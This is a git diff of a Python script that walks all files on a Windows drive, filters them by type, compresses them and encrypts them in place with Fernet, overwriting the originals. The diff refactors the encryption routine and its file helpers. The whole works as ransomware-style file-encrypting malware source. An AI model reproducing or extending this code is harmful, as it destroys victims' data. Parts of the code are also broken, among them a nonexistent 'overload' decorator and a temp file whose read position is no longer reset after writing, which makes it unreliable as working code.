@@ -8,22 +8,61 @@ import sys
 from cryptography.fernet import Fernet
 import tempfile
 from typing import IO
+import traceback
 
 
-def read_files(file_path: str) -> bytes:
-    file :bytes
-    with open(file_path,'rb') as data:
+def read_file(file_path: str) -> bytes:
+    file: bytes
+    with open(file_path, 'rb') as data:
         file = data.read()
         data.close()
     return file
 
 
-def create_temp_file_with_data(data:bytes) -> tempfile.NamedTemporaryFile:
-    t = tempfile.NamedTemporaryFile(mode='w+b', delete=False)
+def create_temp_file_with_data(data: bytes) -> tempfile.NamedTemporaryFile:
+    t = tempfile.NamedTemporaryFile(mode='w+b', delete=True)
     t.write(data)
-    t.seek(0)  # Reset the file pointer to the beginning
+    # t.seek(0)  # Reset the file pointer to the beginning
     return t
 
+
+def save_file(path: str, file_data: bytes) -> bool:
+    try:
+        with open(path, 'wb') as file:
+            file.write(file_data)
+            file.close()
+            return True
+    except:
+        return False
+
+
+@save_file.overload(str, list[list[str]])
+def save_file(path: str, file_data: list[list[str]]) -> None:
+    """
+    Save a multilayer array into a file
+    :param path: Where the file should be save
+    :param file_data: Data of the file
+    :return: None
+    """
+    with open(path, 'w', encoding="utf-8") as save:
+        for e in file_data:
+            for k in e:
+                save.write(f'{k}\n')
+        save.close()
+
+
+@save_file.overload(str,list[str])
+def save_file(path: str, files: list[str]) -> None:
+    """
+    Save a monolayer array
+    :param path: Path for the new file to create
+    :param files: Data that will go in that file
+    :return:
+    """
+    with open(path, 'w', encoding="utf-8") as save:
+        for e in files:
+            save.write(f'{e}\n')
+    save.close()
 
 
 def encrypt_temp_file(tempo: IO[bytes], f_key: Fernet) -> bytes:
@@ -33,43 +72,19 @@ def encrypt_temp_file(tempo: IO[bytes], f_key: Fernet) -> bytes:
     return encrypted_data
 
 
-def save_temp_file(path_to_save: str, tempo: bytes) -> None:
-    with open(path_to_save,'wb') as file:
-        file.write(tempo)
-        file.close()
+def encrypt_file(file_path: str, f_key: Fernet) -> bool:
 
-
-def encrypt_file(file_path: str, f_key: Fernet) -> None:
-    can_be_open: bool = False
-    data: bytes
     tempo: tempfile.NamedTemporaryFile
     try:
-        data = read_files(file_path)
-        can_be_open = True
-    except PermissionError as error:
-        print(error)
-    if can_be_open:
-        try:
-            tempo = create_temp_file_with_data(data)
-        except Exception as error:
-            print(error)
-        try:
-            data = encrypt_temp_file(tempo,f_key)
-        except Exception as error:
-            print(error)
-        try:
-            save_temp_file(file_path, data)
-            tempo.close()
-        except Exception as error:
-            print(error)
-
-    return None
-
-
-
-
-
-
+        file = read_file(file_path)
+        tempo = create_temp_file_with_data(file)
+        file = encrypt_temp_file(tempo, f_key)
+        save_file(file_path, file)
+        tempo.close()
+        return True
+    except:
+        print(traceback.format_exc())
+        return False
 
 
 # ALL DIRECTORY RELATED FUNCTIONS
@@ -97,7 +112,7 @@ def find_directory_from_file(name_of_file: [str], is_compress: bool, path: str, 
     return files
 
 
-def all_files(start_path: str) -> [str]:
+def find_all_files(start_path: str) -> [str]:
     """
     :param start_path: path to look all of the children
     :return : all the computer files
@@ -109,33 +124,6 @@ def all_files(start_path: str) -> [str]:
             file_path = os.path.join(root, file)
             files_in_directory.append(file_path)
     return files_in_directory
-
-
-def save_file(path: str, files: [[str]]) -> None:
-    """
-    Save a multilayer array into a file
-    :param path: Where the file should be save
-    :param files: Data of the file
-    :return: None
-    """
-    with open(path, 'w', encoding="utf-8") as save:
-        for e in files:
-            for k in e:
-                save.write(f'{k}\n')
-        save.close()
-
-
-def save_specific_files(path: str, files: [str]) -> None:
-    """
-    Save a monolayer array
-    :param path: Path for the new file to create
-    :param files: Data that will go in that file
-    :return:
-    """
-    with open(path, 'w', encoding="utf-8") as save:
-        for e in files:
-            save.write(f'{e}\n')
-    save.close()
 
 
 def compress_files(path: [str], compress_file_name: str) -> None:
@@ -161,7 +149,7 @@ def find_file_by_type(data_path: str, file_type: str) -> [str]:
     :param file_type: the type of the file you want to find like .txt, .docx, .exe...
     :return: array of string with all the file absolute path
     """
-    regex = f'^.*(?:{file_type})'   # will look at the extention and take everything before
+    regex = f'^.*(?:{file_type})'  # will look at the extention and take everything before
     reg: [str] = []
     with open(data_path, 'r') as data:
         for e in data:
@@ -225,7 +213,7 @@ def main():
         print(f'starting {init_path}')
 
         # Find all the computers files
-        files.append(all_files(f'{init_path}:\\'))
+        files.append(find_all_files(f'{init_path}:\\'))
 
         # Save Zone
         for e in files_name:
